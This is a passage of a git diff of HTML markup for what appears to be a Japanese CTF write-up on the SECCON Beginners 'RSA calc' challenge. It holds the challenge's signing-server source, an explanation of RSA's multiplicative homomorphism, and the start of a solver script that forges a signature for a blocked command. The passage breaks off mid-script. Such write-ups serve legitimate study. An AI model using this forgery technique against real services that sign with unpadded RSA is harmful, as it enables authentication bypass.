+</span><span class="lnt">91
+</span><span class="lnt">92
+</span><span class="lnt">93
+</span><span class="lnt">94
+</span><span class="lnt">95
+</span><span class="lnt">96
+</span><span class="lnt">97
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">params</span> <span class="kn">import</span> <span class="n">p</span><span class="p">,</span> <span class="n">q</span><span class="p">,</span> <span class="n">flag</span>
+<span class="kn">import</span> <span class="nn">binascii</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">signal</span>
 
 
-N <span style="color:#f92672">=</span> p <span style="color:#f92672">*</span> q
-e <span style="color:#f92672">=</span> <span style="color:#ae81ff">65537</span>
-d <span style="color:#f92672">=</span> inverse(e, (p<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">*</span>(q<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>))
+<span class="n">N</span> <span class="o">=</span> <span class="n">p</span> <span class="o">*</span> <span class="n">q</span>
+<span class="n">e</span> <span class="o">=</span> <span class="mi">65537</span>
+<span class="n">d</span> <span class="o">=</span> <span class="n">inverse</span><span class="p">(</span><span class="n">e</span><span class="p">,</span> <span class="p">(</span><span class="n">p</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">q</span><span class="o">-</span><span class="mi">1</span><span class="p">))</span>
 
 
-<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">input</span>(prompt<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>):
-    sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>write(prompt)
-    sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>flush()
-    <span style="color:#66d9ef">return</span> sys<span style="color:#f92672">.</span>stdin<span style="color:#f92672">.</span>buffer<span style="color:#f92672">.</span>readline()<span style="color:#f92672">.</span>strip()
+<span class="k">def</span> <span class="nf">input</span><span class="p">(</span><span class="n">prompt</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">):</span>
+    <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">prompt</span><span class="p">)</span>
+    <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>
+    <span class="k">return</span> <span class="n">sys</span><span class="o">.</span><span class="n">stdin</span><span class="o">.</span><span class="n">buffer</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
 
-<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">menu</span>():
-    sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#39;&#39;&#39;----------
-</span><span style="color:#e6db74">1) Sign
-</span><span style="color:#e6db74">2) Exec
-</span><span style="color:#e6db74">3) Exit
-</span><span style="color:#e6db74">&#39;&#39;&#39;</span>)
-    <span style="color:#66d9ef">try</span>:
-        sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#39;&gt; &#39;</span>)
-        sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>flush()
-        <span style="color:#66d9ef">return</span> int(sys<span style="color:#f92672">.</span>stdin<span style="color:#f92672">.</span>readline()<span style="color:#f92672">.</span>strip())
-    <span style="color:#66d9ef">except</span>:
-        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">3</span>
-
-
-<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">cmd_sign</span>():
-    data <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#39;data&gt; &#39;</span>)
-    <span style="color:#66d9ef">if</span> len(data) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">256</span>:
-        sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#39;Too long</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
-        <span style="color:#66d9ef">return</span>
-
-    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;F&#39;</span> <span style="color:#f92672">in</span> data <span style="color:#f92672">or</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1337&#39;</span> <span style="color:#f92672">in</span> data:
-        sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#39;Error</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
-        <span style="color:#66d9ef">return</span>
-
-    signature <span style="color:#f92672">=</span> pow(bytes_to_long(data), d, N)
-    sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#39;Signature: {}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(binascii<span style="color:#f92672">.</span>hexlify(long_to_bytes(signature))<span style="color:#f92672">.</span>decode()))
-
-<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">cmd_exec</span>():
-    data <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#39;data&gt; &#39;</span>)
-    signature <span style="color:#f92672">=</span> int(input(<span style="color:#e6db74">&#39;signature&gt; &#39;</span>), <span style="color:#ae81ff">16</span>)
-
-    <span style="color:#66d9ef">if</span> signature <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">or</span> signature <span style="color:#f92672">&gt;=</span> N:
-        sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#39;Invalid signature</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
-        <span style="color:#66d9ef">return</span>
-
-    check <span style="color:#f92672">=</span> long_to_bytes(pow(signature, e, N))
-    <span style="color:#66d9ef">if</span> data <span style="color:#f92672">!=</span> check:
-        sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#39;Invalid signature</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
-        <span style="color:#66d9ef">return</span>
-
-    chunks <span style="color:#f92672">=</span> data<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;,&#39;</span>)
-    stack <span style="color:#f92672">=</span> []
-    <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> chunks:
-        <span style="color:#66d9ef">if</span> c <span style="color:#f92672">==</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;+&#39;</span>:
-            stack<span style="color:#f92672">.</span>append(stack<span style="color:#f92672">.</span>pop() <span style="color:#f92672">+</span> stack<span style="color:#f92672">.</span>pop())
-        <span style="color:#66d9ef">elif</span> c <span style="color:#f92672">==</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;-&#39;</span>:
-            stack<span style="color:#f92672">.</span>append(stack<span style="color:#f92672">.</span>pop() <span style="color:#f92672">-</span> stack<span style="color:#f92672">.</span>pop())
-        <span style="color:#66d9ef">elif</span> c <span style="color:#f92672">==</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;*&#39;</span>:
-            stack<span style="color:#f92672">.</span>append(stack<span style="color:#f92672">.</span>pop() <span style="color:#f92672">*</span> stack<span style="color:#f92672">.</span>pop())
-        <span style="color:#66d9ef">elif</span> c <span style="color:#f92672">==</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/&#39;</span>:
-            stack<span style="color:#f92672">.</span>append(stack<span style="color:#f92672">.</span>pop() <span style="color:#f92672">/</span> stack<span style="color:#f92672">.</span>pop())
-        <span style="color:#66d9ef">elif</span> c <span style="color:#f92672">==</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;F&#39;</span>:
-            val <span style="color:#f92672">=</span> stack<span style="color:#f92672">.</span>pop()
-            <span style="color:#66d9ef">if</span> val <span style="color:#f92672">==</span> <span style="color:#ae81ff">1337</span>:
-                sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>write(flag <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
-        <span style="color:#66d9ef">else</span>:
-            stack<span style="color:#f92672">.</span>append(int(c))
-
-    sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#39;Answer: {}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(int(stack<span style="color:#f92672">.</span>pop())))
+<span class="k">def</span> <span class="nf">menu</span><span class="p">():</span>
+    <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;&#39;&#39;----------
+</span><span class="s1">1) Sign
+</span><span class="s1">2) Exec
+</span><span class="s1">3) Exit
+</span><span class="s1">&#39;&#39;&#39;</span><span class="p">)</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;&gt; &#39;</span><span class="p">)</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>
+        <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">stdin</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="k">return</span> <span class="mi">3</span>
 
 
-<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
-    sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#39;N: {}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(N))
-    <span style="color:#66d9ef">while</span> True:
-        <span style="color:#66d9ef">try</span>:
-            command <span style="color:#f92672">=</span> menu()
-            <span style="color:#66d9ef">if</span> command <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
-                cmd_sign()
-            <span style="color:#66d9ef">if</span> command <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span>:
-                cmd_exec()
-            <span style="color:#66d9ef">elif</span> command <span style="color:#f92672">==</span> <span style="color:#ae81ff">3</span>:
-                <span style="color:#66d9ef">break</span>
-        <span style="color:#66d9ef">except</span>:
-            sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#39;Error</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
-            <span style="color:#66d9ef">break</span>
+<span class="k">def</span> <span class="nf">cmd_sign</span><span class="p">():</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s1">&#39;data&gt; &#39;</span><span class="p">)</span>
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">256</span><span class="p">:</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;Too long</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+        <span class="k">return</span>
+
+    <span class="k">if</span> <span class="sa">b</span><span class="s1">&#39;F&#39;</span> <span class="ow">in</span> <span class="n">data</span> <span class="ow">or</span> <span class="sa">b</span><span class="s1">&#39;1337&#39;</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;Error</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+        <span class="k">return</span>
+
+    <span class="n">signature</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">bytes_to_long</span><span class="p">(</span><span class="n">data</span><span class="p">),</span> <span class="n">d</span><span class="p">,</span> <span class="n">N</span><span class="p">)</span>
+    <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;Signature: {}</span><span class="se">\n</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">binascii</span><span class="o">.</span><span class="n">hexlify</span><span class="p">(</span><span class="n">long_to_bytes</span><span class="p">(</span><span class="n">signature</span><span class="p">))</span><span class="o">.</span><span class="n">decode</span><span class="p">()))</span>
+
+<span class="k">def</span> <span class="nf">cmd_exec</span><span class="p">():</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s1">&#39;data&gt; &#39;</span><span class="p">)</span>
+    <span class="n">signature</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s1">&#39;signature&gt; &#39;</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="n">signature</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="ow">or</span> <span class="n">signature</span> <span class="o">&gt;=</span> <span class="n">N</span><span class="p">:</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;Invalid signature</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+        <span class="k">return</span>
+
+    <span class="n">check</span> <span class="o">=</span> <span class="n">long_to_bytes</span><span class="p">(</span><span class="nb">pow</span><span class="p">(</span><span class="n">signature</span><span class="p">,</span> <span class="n">e</span><span class="p">,</span> <span class="n">N</span><span class="p">))</span>
+    <span class="k">if</span> <span class="n">data</span> <span class="o">!=</span> <span class="n">check</span><span class="p">:</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;Invalid signature</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+        <span class="k">return</span>
+
+    <span class="n">chunks</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;,&#39;</span><span class="p">)</span>
+    <span class="n">stack</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">chunks</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">c</span> <span class="o">==</span> <span class="sa">b</span><span class="s1">&#39;+&#39;</span><span class="p">:</span>
+            <span class="n">stack</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">stack</span><span class="o">.</span><span class="n">pop</span><span class="p">()</span> <span class="o">+</span> <span class="n">stack</span><span class="o">.</span><span class="n">pop</span><span class="p">())</span>
+        <span class="k">elif</span> <span class="n">c</span> <span class="o">==</span> <span class="sa">b</span><span class="s1">&#39;-&#39;</span><span class="p">:</span>
+            <span class="n">stack</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">stack</span><span class="o">.</span><span class="n">pop</span><span class="p">()</span> <span class="o">-</span> <span class="n">stack</span><span class="o">.</span><span class="n">pop</span><span class="p">())</span>
+        <span class="k">elif</span> <span class="n">c</span> <span class="o">==</span> <span class="sa">b</span><span class="s1">&#39;*&#39;</span><span class="p">:</span>
+            <span class="n">stack</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">stack</span><span class="o">.</span><span class="n">pop</span><span class="p">()</span> <span class="o">*</span> <span class="n">stack</span><span class="o">.</span><span class="n">pop</span><span class="p">())</span>
+        <span class="k">elif</span> <span class="n">c</span> <span class="o">==</span> <span class="sa">b</span><span class="s1">&#39;/&#39;</span><span class="p">:</span>
+            <span class="n">stack</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">stack</span><span class="o">.</span><span class="n">pop</span><span class="p">()</span> <span class="o">/</span> <span class="n">stack</span><span class="o">.</span><span class="n">pop</span><span class="p">())</span>
+        <span class="k">elif</span> <span class="n">c</span> <span class="o">==</span> <span class="sa">b</span><span class="s1">&#39;F&#39;</span><span class="p">:</span>
+            <span class="n">val</span> <span class="o">=</span> <span class="n">stack</span><span class="o">.</span><span class="n">pop</span><span class="p">()</span>
+            <span class="k">if</span> <span class="n">val</span> <span class="o">==</span> <span class="mi">1337</span><span class="p">:</span>
+                <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">flag</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">stack</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">c</span><span class="p">))</span>
+
+    <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;Answer: {}</span><span class="se">\n</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">stack</span><span class="o">.</span><span class="n">pop</span><span class="p">())))</span>
 
 
-<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
-    signal<span style="color:#f92672">.</span>alarm(<span style="color:#ae81ff">60</span>)
-    main()
-</code></pre></div><p><code>F</code>または<code>1337</code>を含まないならば、任意の文字列に署名してくれる。そしてスタック署名されたスタックマシンの命令列を実行し、狙ったところに入れる（そのために<code>F</code>や<code>1337</code>が必要）ことができればフラグが入手できる。
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;N: {}</span><span class="se">\n</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">N</span><span class="p">))</span>
+    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">command</span> <span class="o">=</span> <span class="n">menu</span><span class="p">()</span>
+            <span class="k">if</span> <span class="n">command</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+                <span class="n">cmd_sign</span><span class="p">()</span>
+            <span class="k">if</span> <span class="n">command</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
+                <span class="n">cmd_exec</span><span class="p">()</span>
+            <span class="k">elif</span> <span class="n">command</span> <span class="o">==</span> <span class="mi">3</span><span class="p">:</span>
+                <span class="k">break</span>
+        <span class="k">except</span><span class="p">:</span>
+            <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;Error</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+            <span class="k">break</span>
+
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="n">signal</span><span class="o">.</span><span class="n">alarm</span><span class="p">(</span><span class="mi">60</span><span class="p">)</span>
+    <span class="n">main</span><span class="p">()</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><code>F</code>または<code>1337</code>を含まないならば、任意の文字列に署名してくれる。そしてスタック署名されたスタックマシンの命令列を実行し、狙ったところに入れる（そのために<code>F</code>や<code>1337</code>が必要）ことができればフラグが入手できる。
 RSAの準同型性を利用した。端的にいうと、いまRSAのパラメーターとして\(N, e, d\)と、任意の平文\(m_1, m_2\)があるとして、RSAは次がなりたつ。</p>
 <p>$$
 \text{Sign}_{d, N}(m_1 \times m_2) \equiv \text{Sign}_{d, N}(m_1) \times \text{Sign}_{d, N}(m_2) \bmod N
@@ -576,69 +804,137 @@ $$</p>
 <li><code>1337,F</code>を実行し、署名として（3）で得られたものを入れる</li>
 </ol>
 <p>これをやるのが下記のプログラムである。</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> numpy <span style="color:#f92672">as</span> np
-<span style="color:#f92672">import</span> re
-<span style="color:#f92672">import</span> socket
-<span style="color:#f92672">from</span> Crypto.Util.number <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">numpy</span> <span class="kn">as</span> <span class="nn">np</span>
+<span class="kn">import</span> <span class="nn">re</span>
+<span class="kn">import</span> <span class="nn">socket</span>
+<span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="o">*</span>
 
-s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
-s<span style="color:#f92672">.</span>connect((<span style="color:#e6db74">&#34;rsacalc.quals.beginners.seccon.jp&#34;</span>, <span style="color:#ae81ff">10001</span>))
-data <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4096</span>)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>)
-data_n <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>search(<span style="color:#e6db74">&#39;N: (\d+)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, data)<span style="color:#f92672">.</span>group(<span style="color:#ae81ff">1</span>)
+<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s2">&#34;rsacalc.quals.beginners.seccon.jp&#34;</span><span class="p">,</span> <span class="mi">10001</span><span class="p">))</span>
+<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span>
+<span class="n">data_n</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">&#39;N: (\d+)</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
 
-N <span style="color:#f92672">=</span> int(data_n)
+<span class="n">N</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">data_n</span><span class="p">)</span>
 
-<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;N: &#34;</span> <span style="color:#f92672">+</span> str(N))
+<span class="k">print</span><span class="p">(</span><span class="s2">&#34;N: &#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">N</span><span class="p">))</span>
 
-command <span style="color:#f92672">=</span> bytes_to_long(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1337,F&#39;</span>)
-half_command <span style="color:#f92672">=</span> int(command <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span>)
+<span class="n">command</span> <span class="o">=</span> <span class="n">bytes_to_long</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;1337,F&#39;</span><span class="p">)</span>
+<span class="n">half_command</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">command</span> <span class="o">/</span> <span class="mi">2</span><span class="p">)</span>
 
-<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;command: &#34;</span> <span style="color:#f92672">+</span> str(command))
+<span class="k">print</span><span class="p">(</span><span class="s2">&#34;command: &#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">command</span><span class="p">))</span>
 
-<span style="color:#75715e"># Get `2` signature</span>
-s<span style="color:#f92672">.</span>sendall(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
-<span style="color:#66d9ef">print</span>(s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
+<span class="c1"># Get `2` signature</span>
+<span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;1</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">))</span>
 
-s<span style="color:#f92672">.</span>sendall(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\02\n</span><span style="color:#e6db74">&#39;</span>)
+<span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\02\n</span><span class="s1">&#39;</span><span class="p">)</span>
 
-signature_2 <span style="color:#f92672">=</span> int(
-    re<span style="color:#f92672">.</span>search(<span style="color:#e6db74">&#39;Signature: ([\da-f]+)&#39;</span>, s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4096</span>)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))<span style="color:#f92672">.</span>group(<span style="color:#ae81ff">1</span>),
-    <span style="color:#ae81ff">16</span>
-)
+<span class="n">signature_2</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span>
+    <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">&#39;Signature: ([\da-f]+)&#39;</span><span class="p">,</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">))</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span>
+    <span class="mi">16</span>
+<span class="p">)</span>
 
-<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;signature_2: &#34;</span> <span style="color:#f92672">+</span> str(signature_2))
+<span class="k">print</span><span class="p">(</span><span class="s2">&#34;signature_2: &#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">signature_2</span><span class="p">))</span>
 
-<span style="color:#75715e"># Get `half_command` signature</span>
-s<span style="color:#f92672">.</span>sendall(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
-<span style="color:#66d9ef">print</span>(s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
+<span class="c1"># Get `half_command` signature</span>
+<span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;1</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
